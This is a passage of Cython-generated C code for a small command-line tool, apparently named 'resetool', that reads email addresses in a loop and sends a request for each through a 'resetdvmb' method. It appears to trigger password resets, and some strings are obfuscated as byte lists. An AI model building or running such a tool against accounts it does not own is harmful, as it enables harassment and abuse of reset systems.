  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_banner); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __Pyx_XDECREF(__pyx_r);
  __pyx_t_4 = PyList_New(9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_int_106);
  __Pyx_GIVEREF(__pyx_int_106);
  PyList_SET_ITEM(__pyx_t_4, 0, __pyx_int_106);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_4, 1, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_111);
  __Pyx_GIVEREF(__pyx_int_111);
  PyList_SET_ITEM(__pyx_t_4, 2, __pyx_int_111);
  __Pyx_INCREF(__pyx_int_110);
  __Pyx_GIVEREF(__pyx_int_110);
  PyList_SET_ITEM(__pyx_t_4, 3, __pyx_int_110);
  __Pyx_INCREF(__pyx_int_95);
  __Pyx_GIVEREF(__pyx_int_95);
  PyList_SET_ITEM(__pyx_t_4, 4, __pyx_int_95);
  __Pyx_INCREF(__pyx_int_114);
  __Pyx_GIVEREF(__pyx_int_114);
  PyList_SET_ITEM(__pyx_t_4, 5, __pyx_int_114);
  __Pyx_INCREF(__pyx_int_101);
  __Pyx_GIVEREF(__pyx_int_101);
  PyList_SET_ITEM(__pyx_t_4, 6, __pyx_int_101);
  __Pyx_INCREF(__pyx_int_115);
  __Pyx_GIVEREF(__pyx_int_115);
  PyList_SET_ITEM(__pyx_t_4, 7, __pyx_int_115);
  __Pyx_INCREF(__pyx_int_112);
  __Pyx_GIVEREF(__pyx_int_112);
  PyList_SET_ITEM(__pyx_t_4, 8, __pyx_int_112);
  __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_decode_bytes(__pyx_t_2, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyDict_NewPresized(7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  if (__pyx_v_data) {
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
  }
  if (__pyx_v_e) {
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_e, __pyx_v_e) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
  }
  if (__pyx_v_email) {
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_email, __pyx_v_email) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
  }
  if (__pyx_v_json_resp) {
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_json_resp, __pyx_v_json_resp) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
  }
  if (__pyx_v_response) {
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_response, __pyx_v_response) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
  }
  if (__pyx_v_self) {
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_self, __pyx_v_self) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
  }
  if (__pyx_v_status_text) {
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_status_text, __pyx_v_status_text) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
  }
  __pyx_t_8 = (__Pyx_PyDict_ContainsTF(__pyx_t_4, __pyx_t_2, Py_EQ)); if (unlikely(__pyx_t_8 < 0)) __PYX_ERR(0, 88, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if ((__pyx_t_8 != 0)) {
    if (unlikely(!__pyx_v_json_resp)) { __Pyx_RaiseUnboundLocalError("json_resp"); __PYX_ERR(0, 88, __pyx_L1_error) }
    __Pyx_INCREF(__pyx_v_json_resp);
    __pyx_t_1 = __pyx_v_json_resp;
  } else {
    __Pyx_INCREF(Py_None);
    __pyx_t_1 = Py_None;
  }
  __pyx_r = __pyx_t_1;
  __pyx_t_1 = 0;
  goto __pyx_L0;

  

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("source.resetool.resetdvmb", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_data);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XDECREF(__pyx_v_json_resp);
  __Pyx_XDECREF(__pyx_v_status_text);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}



/* Python wrapper */
static PyObject *__pyx_pw_6source_8resetool_7go(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_6source_8resetool_7go = {"go", (PyCFunction)__pyx_pw_6source_8resetool_7go, METH_O, 0};
static PyObject *__pyx_pw_6source_8resetool_7go(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("go (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_8resetool_6go(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_8resetool_6go(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_email = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("go", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear_screen); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 91, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_banner); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 92, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 92, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  while (1) {

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_refresh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 96, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 96, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_t_2, __pyx_kp_u_1_909m_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 96, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 95, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__5, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_XDECREF_SET(__pyx_v_email, __pyx_t_2);
    __pyx_t_2 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_refresh); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_1 = __Pyx_PyObject_FormatSimple(__pyx_t_2, __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

    
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_email, __pyx_n_s_lower); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 99, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 99, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = PyList_New(2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 99, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_INCREF(__pyx_int_113);
    __Pyx_GIVEREF(__pyx_int_113);
    PyList_SET_ITEM(__pyx_t_1, 0, __pyx_int_113);
    __Pyx_INCREF(__pyx_int_113);
    __Pyx_GIVEREF(__pyx_int_113);
    PyList_SET_ITEM(__pyx_t_1, 1, __pyx_int_113);
    __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_decode_bytes(__pyx_t_3, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 99, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = PyObject_RichCompare(__pyx_t_2, __pyx_t_1, Py_EQ); __Pyx_XGOTREF(__pyx_t_3); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely(__pyx_t_4 < 0)) __PYX_ERR(0, 99, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (__pyx_t_4) {

      
      __pyx_t_3 = PyList_New(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 100, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyBytes_Type)), __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 100, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_decode_bytes(__pyx_t_1, 0, PY_SSIZE_T_MAX, NULL, NULL, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 100, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 100, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      
      goto __pyx_L4_break;

      
    }

    
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_resetdvmb); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 103, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
      __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
      if (likely(__pyx_t_2)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
        __Pyx_INCREF(__pyx_t_2);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_3, function);
      }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_email);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 103, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_refresh); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = __Pyx_PyObject_FormatSimple(__pyx_t_1, __pyx_empty_unicode); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 106, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_t_3, __pyx_kp_u_1_95m); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

    
    __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 105, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __pyx_L4_break:;

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("source.resetool.go", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_email);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_n_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 1},
  {&__pyx_kp_u_1_909m, __pyx_k_1_909m, sizeof(__pyx_k_1_909m), 0, 1, 0, 0},
  {&__pyx_kp_u_1_909m_2, __pyx_k_1_909m_2, sizeof(__pyx_k_1_909m_2), 0, 1, 0, 0},
  {&__pyx_kp_u_1_909m_5, __pyx_k_1_909m_5, sizeof(__pyx_k_1_909m_5), 0, 1, 0, 0},
  {&__pyx_kp_u_1_95m, __pyx_k_1_95m, sizeof(__pyx_k_1_95m), 0, 1, 0, 0},
  {&__pyx_kp_u_3_36m, __pyx_k_3_36m, sizeof(__pyx_k_3_36m), 0, 1, 0, 0},
  {&__pyx_n_s_LightYellow, __pyx_k_LightYellow, sizeof(__pyx_k_LightYellow), 0, 0, 1, 1},
  {&__pyx_n_s_R, __pyx_k_R, sizeof(__pyx_k_R), 0, 0, 1, 1},
  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},
  {&__pyx_kp_u__3, __pyx_k__3, sizeof(__pyx_k__3), 0, 1, 0, 0},
  {&__pyx_kp_u__4, __pyx_k__4, sizeof(__pyx_k__4), 0, 1, 0, 0},
  {&__pyx_n_s_align, __pyx_k_align, sizeof(__pyx_k_align), 0, 0, 1, 1},
  {&__pyx_n_s_background, __pyx_k_background, sizeof(__pyx_k_background), 0, 0, 1, 1},
  {&__pyx_n_s_banner, __pyx_k_banner, sizeof(__pyx_k_banner), 0, 0, 1, 1},
  {&__pyx_n_s_bgcyan, __pyx_k_bgcyan, sizeof(__pyx_k_bgcyan), 0, 0, 1, 1},
  {&__pyx_n_s_cfonts, __pyx_k_cfonts, sizeof(__pyx_k_cfonts), 0, 0, 1, 1},
  {&__pyx_n_s_clear_screen, __pyx_k_clear_screen, sizeof(__pyx_k_clear_screen), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_colors, __pyx_k_colors, sizeof(__pyx_k_colors), 0, 0, 1, 1},
  {&__pyx_n_s_data, __pyx_k_data, sizeof(__pyx_k_data), 0, 0, 1, 1},
  {&__pyx_n_s_doc, __pyx_k_doc, sizeof(__pyx_k_doc), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_email, __pyx_k_email, sizeof(__pyx_k_email), 0, 0, 1, 1},
  {&__pyx_n_s_get, __pyx_k_get, sizeof(__pyx_k_get), 0, 0, 1, 1},
  {&__pyx_n_s_go, __pyx_k_go, sizeof(__pyx_k_go), 0, 0, 1, 1},
  {&__pyx_n_s_green, __pyx_k_green, sizeof(__pyx_k_green), 0, 0, 1, 1},
  {&__pyx_n_s_headers, __pyx_k_headers, sizeof(__pyx_k_headers), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_init, __pyx_k_init, sizeof(__pyx_k_init), 0, 0, 1, 1},
  {&__pyx_n_s_input, __pyx_k_input, sizeof(__pyx_k_input), 0, 0, 1, 1},
  {&__pyx_n_s_json, __pyx_k_json, sizeof(__pyx_k_json), 0, 0, 1, 1},
  {&__pyx_n_s_json_resp, __pyx_k_json_resp, sizeof(__pyx_k_json_resp), 0, 0, 1, 1},
  {&__pyx_n_s_lower, __pyx_k_lower, sizeof(__pyx_k_lower), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_metaclass, __pyx_k_metaclass, sizeof(__pyx_k_metaclass), 0, 0, 1, 1},
  {&__pyx_n_s_module, __pyx_k_module, sizeof(__pyx_k_module), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_name_2, __pyx_k_name_2, sizeof(__pyx_k_name_2), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_post, __pyx_k_post, sizeof(__pyx_k_post), 0, 0, 1, 1},
  {&__pyx_n_s_prepare, __pyx_k_prepare, sizeof(__pyx_k_prepare), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_qualname, __pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 0, 1, 1},
  {&__pyx_n_s_red, __pyx_k_red, sizeof(__pyx_k_red), 0, 0, 1, 1},
  {&__pyx_n_s_refresh, __pyx_k_refresh, sizeof(__pyx_k_refresh), 0, 0, 1, 1},
  {&__pyx_n_s_render, __pyx_k_render, sizeof(__pyx_k_render), 0, 0, 1, 1},
  {&__pyx_n_s_requests, __pyx_k_requests, sizeof(__pyx_k_requests), 0, 0, 1, 1},
  {&__pyx_n_s_resetdvmb, __pyx_k_resetdvmb, sizeof(__pyx_k_resetdvmb), 0, 0, 1, 1},
  {&__pyx_n_s_resetool, __pyx_k_resetool, sizeof(__pyx_k_resetool), 0, 0, 1, 1},
  {&__pyx_n_s_resetool___init, __pyx_k_resetool___init, sizeof(__pyx_k_resetool___init), 0, 0, 1, 1},
  {&__pyx_n_s_resetool_banner, __pyx_k_resetool_banner, sizeof(__pyx_k_resetool_banner), 0, 0, 1, 1},
  {&__pyx_n_s_resetool_go, __pyx_k_resetool_go, sizeof(__pyx_k_resetool_go), 0, 0, 1, 1},
  {&__pyx_n_s_resetool_resetdvmb, __pyx_k_resetool_resetdvmb, sizeof(__pyx_k_resetool_resetdvmb), 0, 0, 1, 1},
  {&__pyx_n_s_response, __pyx_k_response, sizeof(__pyx_k_response), 0, 0, 1, 1},
  {&__pyx_n_s_self, __pyx_k_self, sizeof(__pyx_k_self), 0, 0, 1, 1},
  {&__pyx_n_s_sleep, __pyx_k_sleep, sizeof(__pyx_k_sleep), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_s_status_text, __pyx_k_status_text, sizeof(__pyx_k_status_text), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_textt, __pyx_k_textt, sizeof(__pyx_k_textt), 0, 0, 1, 1},
  {&__pyx_n_s_time, __pyx_k_time, sizeof(__pyx_k_time), 0, 0, 1, 1},
  {&__pyx_n_s_url, __pyx_k_url, sizeof(__pyx_k_url), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 59, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 97, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple__5 = PyTuple_Pack(1, __pyx_kp_u_3_36m); if (unlikely(!__pyx_tuple__5)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__5);
  __Pyx_GIVEREF(__pyx_tuple__5);

  
  __pyx_codeobj__6 = (PyObject*)__Pyx_PyCode_New(0, 0, 0, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_clear_screen, 18, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__6)) __PYX_ERR(0, 18, __pyx_L1_error)

  
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 23, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
